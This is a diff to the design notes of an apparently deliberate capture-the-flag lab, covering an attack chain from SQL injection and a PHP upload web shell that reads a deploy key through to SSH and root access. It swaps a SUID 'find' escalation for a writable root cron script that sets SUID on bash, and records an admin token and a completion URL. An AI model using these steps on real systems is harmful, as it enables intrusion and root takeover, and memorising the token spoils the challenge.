@@ -38,7 +38,7 @@ Step 3b (optional)  crack j.harris MD5 → login → /messages UI (same DM)
 Step 4  RCE         PHP upload → /static/uploads/shell.png.php?cmd=cat /var/cerodias/deploy.key
 Step 5  Decrypt     openssl + blob (SQLi) + passphrase (RCE) → id_rsa
 Step 6  SSH         ssh -i id_rsa svc_admin@localhost -p 2222   [Docker]
-Step 7  Privesc     SUID find → root                           [Docker]
+Step 7  Privesc     cron writable script → root                [Docker]
 ```
 
 ---
@@ -476,7 +476,7 @@ must read the source (`app/core/totp_util.py`) via SSTI to find the scheme.
 | RCE | browser, curl |
 | Decrypt SSH key | openssl, base64 |
 | SSH | ssh |
-| Privesc | find, GTFOBins |
+| Privesc | bash, cat, ls, cron wait |
 
 ---
 
@@ -539,8 +539,12 @@ Manual checklist:
 - [ ] base64-decode encrypted_ssh_key + openssl decrypt = valid RSA PEM
 - [ ] `docker-compose up --build` starts web (5001) and ssh-server (2222)
 - [ ] `ssh -i id_rsa svc_admin@localhost -p 2222` gives shell (Docker required)
-- [ ] `find / -perm -4000 2>/dev/null` reveals SUID find binary (Docker)
-- [ ] `find . -exec /bin/sh -p \; -quit` gives root shell (Docker)
+- [ ] `cat /etc/crontab` shows `maintenance.sh` running every minute as root (Docker)
+- [ ] `ls -la /opt/cerodias/maintenance.sh` shows -rwxrwxrwx (777) with Nov 15 mtime (Docker)
+- [ ] `echo 'chmod u+s /bin/bash' >> /opt/cerodias/maintenance.sh` then `/bin/bash -p` gives root (Docker)
+- [ ] `cat /root/INCIDENT_DRAFT.txt` shows k.chen unsent draft naming every chain step (Docker)
+- [ ] `cat /root/.cerodias/admin_token` returns `cerodias-admin-9f2a4c1b7e3d8a5f` (Docker)
+- [ ] `GET /admin/chain-complete?token=cerodias-admin-9f2a4c1b7e3d8a5f` renders chain completion page
 
 ---
 
